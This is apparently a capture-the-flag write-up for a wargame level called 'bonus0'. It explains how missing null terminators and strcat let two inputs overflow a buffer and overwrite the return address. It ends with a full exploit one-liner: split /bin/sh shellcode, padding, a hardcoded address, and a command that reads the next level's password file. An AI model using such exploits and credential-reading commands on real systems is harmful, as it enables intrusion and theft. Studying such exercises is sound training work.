
ltrace tells use pretty much all the program does:
- take an input, replace \n by \0, put the 20 first char it in a buffer
- do that a second time
- copy the first input to a bigger buffer
- strcat the second one to it

Since if the input are longer that 20 char, they get copied without \0, we can inject shellcode.
We can override eip with inputB, and so put in it the address of our code.
So we need a place to store that code: inputA is perfect, except a bit short. But thanks to strcat, we can put the little extra at the start of inputB.
Since ltrace show us the address of the final buffer, the target is easy to find.
So we need :

InputA = shellcode_p1
InputB = sheelcode_p2 + padding + address_of_strcat_buf + padding

Since we are piping stuff, we need to remember to pass our shell command directly.

```
./bonus0 < <(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd"'; python -c 'print "\x80" + "B"*8 + "\xf6\xfb\xff\xbf" + "U"*9'; python -c 'print "cat /home/user/bonus1/.pass"')
```
